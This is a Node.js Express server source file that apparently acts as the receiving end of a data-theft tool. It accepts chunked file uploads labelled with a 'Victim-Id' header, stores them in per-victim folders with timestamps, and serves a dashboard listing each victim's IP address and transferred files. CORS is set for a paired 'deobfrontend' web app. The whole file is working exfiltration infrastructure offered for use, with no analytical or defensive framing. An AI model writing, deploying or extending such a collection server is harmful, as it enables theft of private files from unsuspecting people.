const fs = require('fs');
require('dotenv').config();
const cors = require('cors');
const express = require('express');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 8080;

// Enable CORS
const corsOptions = {
    origin: ['https://deobfrontend-f30nw0x1c-2naseernoors-projects.vercel.app', 'https://deobfrontend-git-main-2naseernoors-projects.vercel.app'],
    methods: ['GET', 'POST', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Victim-Id', 'Filename', 'Chunk-Index', 'Total-Chunks', 'Total-Files'],
    credentials: true,
};
app.use(cors(corsOptions));
app.use(express.raw({ type: 'application/octet-stream', limit: '100mb' }));

const OUTPUT_BASE_DIR = path.join(__dirname, 'received_files');
if (!fs.existsSync(OUTPUT_BASE_DIR)) {
    fs.mkdirSync(OUTPUT_BASE_DIR, { recursive: true });
}

const victimFolders = {};
const victimFileCounts = {};
const victimTotalFiles = {};
const connectedDevices = {};
const chunkTracker = new Map();

function checkAndSendEmail(victimId, victimFolder) {
    const filesInFolder = fs.readdirSync(victimFolder);
    if (filesInFolder.length === victimTotalFiles[victimId]) {
        console.log(`✅ All files received for victim ${victimId}`);
        const timeTaken = Date.now() - connectedDevices[victimId].startTransferTime;
        connectedDevices[victimId].totalUploadTime = (timeTaken / 1000).toFixed(2);
        console.log(`⏱️ Total upload time for ${victimId}: ${connectedDevices[victimId].totalUploadTime} seconds`);
    }
}

app.post('/upload', (req, res) => {
    try {
        const filename = decodeURIComponent(req.headers['filename']);
        const victimId = decodeURIComponent(req.headers['victim-id']);
        const chunkIndex = parseInt(req.headers['chunk-index']);
        const totalChunks = parseInt(req.headers['total-chunks']);
        const totalFiles = parseInt(req.headers['total-files']);
        const ip = req.ip;

        if (!filename || !victimId || isNaN(chunkIndex) || isNaN(totalChunks) || isNaN(totalFiles)) {
            return res.status(400).json({ error: 'Missing or invalid headers' });
        }

        if (!connectedDevices[victimId]) {
            connectedDevices[victimId] = {
                ip: ip,
                connectionTime: Date.now(),
                startTransferTime: null,
                totalFiles: totalFiles,
                filesTransferred: 0,
                fileList: []
            };
        }

        if (!victimFolders[victimId]) {
            const timestamp = new Date().toISOString().replace(/:/g, '-');
            victimFolders[victimId] = path.join(OUTPUT_BASE_DIR, `${victimId}_${timestamp}`);
            fs.mkdirSync(victimFolders[victimId], { recursive: true });
            victimFileCounts[victimId] = 0;
            victimTotalFiles[victimId] = totalFiles;
        }

        if (!connectedDevices[victimId].startTransferTime) {
            connectedDevices[victimId].startTransferTime = Date.now();
        }

        const victimFolder = victimFolders[victimId];
        const filePath = path.join(victimFolder, filename);

        fs.appendFile(filePath, req.body, (err) => {
            if (err) {
                console.error(`❌ Error writing file:`, err);
                return res.status(500).json({ error: 'Error saving file' });
            }

            victimFileCounts[victimId] += 1;
            connectedDevices[victimId].filesTransferred += 1;
            if (!connectedDevices[victimId].fileList.includes(filename)) {
                connectedDevices[victimId].fileList.push(filename);
            }

            if (victimFileCounts[victimId] === totalFiles) {
                connectedDevices[victimId].endTransferTime = Date.now();
                connectedDevices[victimId].totalUploadTime = ((connectedDevices[victimId].endTransferTime - connectedDevices[victimId].startTransferTime) / 1000).toFixed(2);
                console.log(`✅ All ${totalFiles} files received for ${victimId} in ${connectedDevices[victimId].totalUploadTime} seconds`);
            }

            res.status(200).json({ message: 'Chunk received successfully' });
        });
    } catch (error) {
        console.error(`❌ Upload error:`, error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

app.get('/dashboard-data', (req, res) => {
    res.json(connectedDevices);
});

app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
});